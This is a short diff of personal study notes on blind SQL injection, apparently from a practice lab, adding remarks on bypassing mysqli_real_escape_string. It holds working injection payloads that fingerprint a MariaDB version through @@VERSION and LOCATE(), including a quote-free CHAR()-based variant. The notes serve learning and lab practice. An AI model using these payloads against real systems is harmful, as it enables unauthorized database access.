@@ -73,6 +73,7 @@
 - `1' AND @@VERSION="10.4.17-MariaDB";-- -` this worked
 
 ## Medium
+- Here we had `mysqli_real_escape_string` trying to sanitize the input. However this could be easily bypassed. [[SQL-Injection/Examples]]
 ```
 1 AND LOCATE(10,@@VERSION); -- -	-> True
 
@@ -83,6 +84,11 @@
 1 AND LOCATE(4.1,@@VERSION); -- -	-> True
 
 1 AND LOCATE(4.17,@@VERSION); -- -	-> True
+```
+
+#### Better way
+```
+1 AND LOCATE(CONCAT(CHAR(77)),@@VERSION);-- -	-> True eheheheh
 
 ```
 - Still gotta find a way to brute check string part of version.
